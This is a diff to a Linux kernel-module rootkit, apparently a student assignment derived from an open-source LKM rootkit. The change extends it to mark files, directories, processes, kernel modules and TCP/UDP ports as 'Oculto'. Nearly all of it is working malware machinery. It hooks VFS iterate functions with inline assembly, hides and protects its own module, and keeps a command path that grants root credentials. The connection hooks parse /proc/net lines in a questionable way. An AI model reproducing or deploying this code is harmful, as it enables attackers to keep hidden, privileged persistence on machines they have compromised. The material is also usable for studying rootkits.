@@ -1,6 +1,7 @@
 /*
- * Rootkit Modificado - Tarea 3
- * Modifica el comportamiento de ocultamiento de archivos para mostrar "Oculto" en lugar de ocultar
+ * Rootkit Modificado - Tarea 3 - VERSIÓN COMPLETA CON DIRECTORIOS
+ * Modifica el comportamiento de ocultamiento para mostrar "Oculto" en lugar de ocultar
+ * Incluye: Archivos, Directorios, Procesos, Módulos de Kernel y Conexiones de Red
  * 
  * Basado en el trabajo original de:
  * Copyright (C) 2016-2019 Maxim Biro <nurupo.contributions@gmail.com>
@@ -60,7 +61,7 @@ struct proc_dir_entry {
 #define pr_fmt(fmt) KBUILD_MODNAME ": " fmt
 
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("Estudiante - Tarea 3 Modificada");
+MODULE_AUTHOR("Estudiante - Tarea 3 Completa + Directorios");
 
 #define ARCH_ERROR_MESSAGE "Only i386 and x86_64 architectures are supported! " \
     "It should be easy to port to new architectures though"
@@ -377,6 +378,214 @@ void file_remove_all(void)
     }
 }
 
+// ========== DIRECTORY LIST - NUEVA FUNCIONALIDAD ==========
+
+struct directory_entry {
+    char *name;
+    struct list_head list;
+};
+
+LIST_HEAD(directory_list);
+
+int directory_add(const char *name)
+{
+    struct directory_entry *d = kmalloc(sizeof(struct directory_entry), GFP_KERNEL);
+
+    if (!d) {
+        return 0;
+    }
+
+    size_t name_len = strlen(name) + 1;
+
+    if (name_len - 1 > NAME_MAX) {
+        kfree(d);
+        return 0;
+    }
+
+    d->name = kmalloc(name_len, GFP_KERNEL);
+    if (!d->name) {
+        kfree(d);
+        return 0;
+    }
+
+    strncpy(d->name, name, name_len);
+    list_add(&d->list, &directory_list);
+
+    return 1;
+}
+
+void directory_remove(const char *name)
+{
+    struct directory_entry *d, *tmp;
+
+    list_for_each_entry_safe(d, tmp, &directory_list, list) {
+        if (strcmp(d->name, name) == 0) {
+            list_del(&d->list);
+            kfree(d->name);
+            kfree(d);
+            break;
+        }
+    }
+}
+
+void directory_remove_all(void)
+{
+    struct directory_entry *d, *tmp;
+
+    list_for_each_entry_safe(d, tmp, &directory_list, list) {
+        list_del(&d->list);
+        kfree(d->name);
+        kfree(d);
+    }
+}
+
+// ========== MODULE LIST ==========
+
+struct module_entry {
+    char *name;
+    struct list_head list;
+};
+
+LIST_HEAD(module_list_hidden);
+
+int module_add(const char *name)
+{
+    struct module_entry *m = kmalloc(sizeof(struct module_entry), GFP_KERNEL);
+
+    if (!m) {
+        return 0;
+    }
+
+    size_t name_len = strlen(name) + 1;
+
+    if (name_len - 1 > MODULE_NAME_LEN) {
+        kfree(m);
+        return 0;
+    }
+
+    m->name = kmalloc(name_len, GFP_KERNEL);
+    if (!m->name) {
+        kfree(m);
+        return 0;
+    }
+
+    strncpy(m->name, name, name_len);
+    list_add(&m->list, &module_list_hidden);
+
+    return 1;
+}
+
+void module_remove(const char *name)
+{
+    struct module_entry *m, *tmp;
+
+    list_for_each_entry_safe(m, tmp, &module_list_hidden, list) {
+        if (strcmp(m->name, name) == 0) {
+            list_del(&m->list);
+            kfree(m->name);
+            kfree(m);
+            break;
+        }
+    }
+}
+
+void module_remove_all(void)
+{
+    struct module_entry *m, *tmp;
+
+    list_for_each_entry_safe(m, tmp, &module_list_hidden, list) {
+        list_del(&m->list);
+        kfree(m->name);
+        kfree(m);
+    }
+}
+
+// ========== CONNECTION LIST ==========
+
+struct connection_entry {
+    char *local_addr;
+    char *remote_addr;
+    unsigned int local_port;
+    unsigned int remote_port;
+    struct list_head list;
+};
+
+LIST_HEAD(connection_list);
+
+int connection_add(const char *local_addr, unsigned int local_port, 
+                  const char *remote_addr, unsigned int remote_port)
+{
+    struct connection_entry *c = kmalloc(sizeof(struct connection_entry), GFP_KERNEL);
+
+    if (!c) {
+        return 0;
+    }
+
+    size_t local_len = strlen(local_addr) + 1;
+    size_t remote_len = strlen(remote_addr) + 1;
+
+    c->local_addr = kmalloc(local_len, GFP_KERNEL);
+    c->remote_addr = kmalloc(remote_len, GFP_KERNEL);
+
+    if (!c->local_addr || !c->remote_addr) {
+        if (c->local_addr) kfree(c->local_addr);
+        if (c->remote_addr) kfree(c->remote_addr);
+        kfree(c);
+        return 0;
+    }
+
+    strncpy(c->local_addr, local_addr, local_len);
+    strncpy(c->remote_addr, remote_addr, remote_len);
+    c->local_port = local_port;
+    c->remote_port = remote_port;
+
+    list_add(&c->list, &connection_list);
+    return 1;
+}
+
+// Función simplificada para ocultar por puerto local solamente
+int connection_add_by_port(unsigned int port)
+{
+    struct connection_entry *c = kmalloc(sizeof(struct connection_entry), GFP_KERNEL);
+
+    if (!c) {
+        return 0;
+    }
+
+    c->local_addr = NULL;
+    c->remote_addr = NULL;
+    c->local_port = port;
+    c->remote_port = 0;
+
+    list_add(&c->list, &connection_list);
+    return 1;
+}
+
+void connection_remove_by_port(unsigned int port)
+{
+    struct connection_entry *c, *tmp;
+
+    list_for_each_entry_safe(c, tmp, &connection_list, list) {
+        if (c->local_port == port && !c->local_addr) {
+            list_del(&c->list);
+            kfree(c);
+            break;
+        }
+    }
+}
+
+void connection_remove_all(void)
+{
+    struct connection_entry *c, *tmp;
+
+    list_for_each_entry_safe(c, tmp, &connection_list, list) {
+        list_del(&c->list);
+        if (c->local_addr) kfree(c->local_addr);
+        if (c->remote_addr) kfree(c->remote_addr);
+        kfree(c);
+    }
+}
+
 // ========== HIDE ==========
 
 struct list_head *module_list;
@@ -427,7 +636,7 @@ void unprotect(void)
     is_protected = 0;
 }
 
-// ========== READDIR - MODIFICACIÓN PRINCIPAL ==========
+// ========== READDIR - MODIFICACIÓN PRINCIPAL CON DIRECTORIOS ==========
 
 struct file_operations *get_fop(const char *path)
 {
@@ -475,40 +684,95 @@ struct file_operations *get_fop(const char *path)
 #define READDIR_HOOK_START(NAME) FILLDIR_START(NAME)
 #define READDIR_HOOK_END(NAME) FILLDIR_END(NAME) READDIR(NAME)
 
-// MODIFICACIÓN: En lugar de ocultar archivos, los muestra como "Oculto"
+// MODIFICACIÓN: Archivos Y Directorios
 READDIR_HOOK_START(root)
     struct file_entry *f;
+    struct directory_entry *d;
 
+    // Verificar archivos (código existente)
     list_for_each_entry(f, &file_list, list) {
         if (strcmp(name, f->name) == 0) {
-            // CAMBIO PRINCIPAL: En lugar de retornar 0 (ocultar), 
-            // modificamos el nombre a "Oculto" y lo mostramos
             pr_info("Archivo '%s' encontrado en lista, mostrando como 'Oculto'\n", name);
             return original_root_filldir(context, "Oculto", 6, offset, ino, d_type);
         }
     }
+
+    // NUEVO: Verificar directorios
+    if (d_type == DT_DIR) {  // Solo si es un directorio
+        list_for_each_entry(d, &directory_list, list) {
+            if (strcmp(name, d->name) == 0) {
+                pr_info("Directorio '%s' encontrado en lista, mostrando como 'Oculto'\n", name);
+                return original_root_filldir(context, "Oculto", 6, offset, ino, d_type);
+            }
+        }
+    }
 READDIR_HOOK_END(root)
 
-// MODIFICACIÓN: Para procesos también se puede aplicar el mismo concepto
+// MODIFICACIÓN: Para procesos
 READDIR_HOOK_START(proc)
     struct pid_entry *p;
 
     list_for_each_entry(p, &pid_list, list) {
         if (simple_strtoul(name, NULL, 10) == p->pid) {
-            // CAMBIO: Mostrar como "Oculto" en lugar de ocultar completamente
             pr_info("PID '%s' encontrado en lista, mostrando como 'Oculto'\n", name);
             return original_proc_filldir(context, "Oculto", 6, offset, ino, d_type);
         }
     }
 READDIR_HOOK_END(proc)
 
+// MODIFICACIÓN: Para módulos de kernel
 READDIR_HOOK_START(sys)
+    // Verificar si es el módulo actual (funcionalidad original)
     if (is_hidden && strcmp(name, KBUILD_MODNAME) == 0) {
-        // Para el módulo del kernel, también aplicamos la modificación
         pr_info("Módulo '%s' oculto, mostrando como 'Oculto'\n", name);
         return original_sys_filldir(context, "Oculto", 6, offset, ino, d_type);
     }
+    
+    // Verificar módulos en la lista
+    struct module_entry *m;
+    list_for_each_entry(m, &module_list_hidden, list) {
+        if (strcmp(name, m->name) == 0) {
+            pr_info("Módulo '%s' encontrado en lista, mostrando como 'Oculto'\n", name);
+            return original_sys_filldir(context, "Oculto", 6, offset, ino, d_type);
+        }
+    }
 READDIR_HOOK_END(sys)
+
+// Para interceptar archivos de conexiones TCP
+READDIR_HOOK_START(procnet_tcp)
+    char line_buffer[256];
+    unsigned int local_port;
+    
+    if (sscanf(name, "%*s %*X:%X", &local_port) == 1) {
+        struct connection_entry *c;
+        list_for_each_entry(c, &connection_list, list) {
+            if (c->local_port == local_port && !c->local_addr) {
+                pr_info("Conexión puerto %u encontrada, mostrando como 'Oculto'\n", local_port);
+                snprintf(line_buffer, sizeof(line_buffer), "Oculto: Puerto %u", local_port);
+                return original_procnet_tcp_filldir(context, line_buffer, strlen(line_buffer), 
+                                                   offset, ino, d_type);
+            }
+        }
+    }
+READDIR_HOOK_END(procnet_tcp)
+
+// Para interceptar archivos de conexiones UDP
+READDIR_HOOK_START(procnet_udp)
+    char line_buffer[256];
+    unsigned int local_port;
+    
+    if (sscanf(name, "%*s %*X:%X", &local_port) == 1) {
+        struct connection_entry *c;
+        list_for_each_entry(c, &connection_list, list) {
+            if (c->local_port == local_port && !c->local_addr) {
+                pr_info("Conexión UDP puerto %u encontrada, mostrando como 'Oculto'\n", local_port);
+                snprintf(line_buffer, sizeof(line_buffer), "Oculto: Puerto UDP %u", local_port);
+                return original_procnet_udp_filldir(context, line_buffer, strlen(line_buffer), 
+                                                   offset, ino, d_type);
+            }
+        }
+    }
+READDIR_HOOK_END(procnet_udp)
 
 #undef FILLDIR_START
 #undef FILLDIR_END
@@ -516,7 +780,7 @@ READDIR_HOOK_END(sys)
 #undef READDIR_HOOK_START
 #undef READDIR_HOOK_END
 
-// ========== COMMAND EXECUTION ==========
+// ========== COMMAND EXECUTION - EXTENDIDO CON DIRECTORIOS ==========
 
 int execute_command(const char __user *str, size_t length)
 {
@@ -542,23 +806,56 @@ int execute_command(const char __user *str, size_t length)
 #endif
 
         commit_creds(creds);
-    } else if (strcmp(str, CFG_HIDE_PID) == 0) {
+    } else if (strncmp(str, CFG_HIDE_PID, sizeof(CFG_HIDE_PID) - 1) == 0) {
         pr_info("Got hide pid command - will show as 'Oculto'\n");
         str += sizeof(CFG_HIDE_PID);
         pid_add(str);
-    } else if (strcmp(str, CFG_UNHIDE_PID) == 0) {
+    } else if (strncmp(str, CFG_UNHIDE_PID, sizeof(CFG_UNHIDE_PID) - 1) == 0) {
         pr_info("Got unhide pid command\n");
         str += sizeof(CFG_UNHIDE_PID);
         pid_remove(str);
-    } else if (strcmp(str, CFG_HIDE_FILE) == 0) {
+    } else if (strncmp(str, CFG_HIDE_FILE, sizeof(CFG_HIDE_FILE) - 1) == 0) {
         pr_info("Got hide file command - will show as 'Oculto'\n");
         str += sizeof(CFG_HIDE_FILE);
         file_add(str);
-    } else if (strcmp(str, CFG_UNHIDE_FILE) == 0) {
+    } else if (strncmp(str, CFG_UNHIDE_FILE, sizeof(CFG_UNHIDE_FILE) - 1) == 0) {
         pr_info("Got unhide file command\n");
         str += sizeof(CFG_UNHIDE_FILE);
         file_remove(str);
-    }  else if (strcmp(str, CFG_HIDE) == 0) {
+    } 
+    // NUEVOS COMANDOS PARA DIRECTORIOS
+    else if (strncmp(str, CFG_HIDE_DIR, sizeof(CFG_HIDE_DIR) - 1) == 0) {
+        pr_info("Got hide directory command - will show as 'Oculto'\n");
+        str += sizeof(CFG_HIDE_DIR);
+        directory_add(str);
+    } else if (strncmp(str, CFG_UNHIDE_DIR, sizeof(CFG_UNHIDE_DIR) - 1) == 0) {
+        pr_info("Got unhide directory command\n");
+        str += sizeof(CFG_UNHIDE_DIR);
+        directory_remove(str);
+    }
+    // COMANDOS PARA MÓDULOS
+    else if (strncmp(str, CFG_HIDE_MODULE, sizeof(CFG_HIDE_MODULE) - 1) == 0) {
+        pr_info("Got hide module command - will show as 'Oculto'\n");
+        str += sizeof(CFG_HIDE_MODULE);
+        module_add(str);
+    } else if (strncmp(str, CFG_UNHIDE_MODULE, sizeof(CFG_UNHIDE_MODULE) - 1) == 0) {
+        pr_info("Got unhide module command\n");
+        str += sizeof(CFG_UNHIDE_MODULE);
+        module_remove(str);
+    }
+    // COMANDOS PARA CONEXIONES
+    else if (strncmp(str, CFG_HIDE_CONNECTION, sizeof(CFG_HIDE_CONNECTION) - 1) == 0) {
+        pr_info("Got hide connection command - will show as 'Oculto'\n");
+        str += sizeof(CFG_HIDE_CONNECTION);
+        unsigned int port = simple_strtoul(str, NULL, 10);
+        connection_add_by_port(port);
+    } else if (strncmp(str, CFG_UNHIDE_CONNECTION, sizeof(CFG_UNHIDE_CONNECTION) - 1) == 0) {
+        pr_info("Got unhide connection command\n");
+        str += sizeof(CFG_UNHIDE_CONNECTION);
+        unsigned int port = simple_strtoul(str, NULL, 10);
+        connection_remove_by_port(port);
+    }
+    else if (strcmp(str, CFG_HIDE) == 0) {
         pr_info("Got hide command - module will show as 'Oculto'\n");
         hide();
     } else if (strcmp(str, CFG_UNHIDE) == 0) {
@@ -662,12 +959,13 @@ found:
     return 1;
 }
 
-// ========== INITIALIZATION ==========
+// ========== INITIALIZATION - CON DIRECTORIOS ==========
 
 int init(void)
 {
-    pr_info("Rootkit Modificado - Tarea 3 cargado\n");
-    pr_info("Los archivos 'ocultos' ahora se mostrarán como 'Oculto'\n");
+    pr_info("Rootkit Completo + Directorios - Tarea 3 cargado\n");
+    pr_info("Funcionalidades: archivos, directorios, procesos, módulos y conexiones\n");
+    pr_info("Los elementos 'ocultos' ahora se mostrarán como 'Oculto'\n");
     
     hide();
     protect();
@@ -684,9 +982,23 @@ int init(void)
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
     LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0)
 
+    // Hooks existentes
     asm_hook_create(get_fop("/")->iterate, root_iterate);
     asm_hook_create(get_fop("/proc")->iterate, proc_iterate);
     asm_hook_create(get_fop("/sys")->iterate, sys_iterate);
+    
+    // Hooks para conexiones
+    struct file_operations *procnet_tcp_fops = get_fop("/proc/net/tcp");
+    if (procnet_tcp_fops && procnet_tcp_fops->iterate) {
+        asm_hook_create(procnet_tcp_fops->iterate, procnet_tcp_iterate);
+        pr_info("Hooked /proc/net/tcp\n");
+    }
+    
+    struct file_operations *procnet_udp_fops = get_fop("/proc/net/udp");
+    if (procnet_udp_fops && procnet_udp_fops->iterate) {
+        asm_hook_create(procnet_udp_fops->iterate, procnet_udp_iterate);
+        pr_info("Hooked /proc/net/udp\n");
+    }
 
 #endif
 
@@ -699,10 +1011,13 @@ void exit(void)
     hook_remove_all();
     pid_remove_all();
     file_remove_all();
+    directory_remove_all();     // NUEVO - para directorios
+    module_remove_all();
+    connection_remove_all();
 
     THIS_MODULE->name[0] = 0;
 
-    pr_info("Rootkit Modificado removido\n");
+    pr_info("Rootkit Completo + Directorios removido\n");
 }
 
 module_init(init);
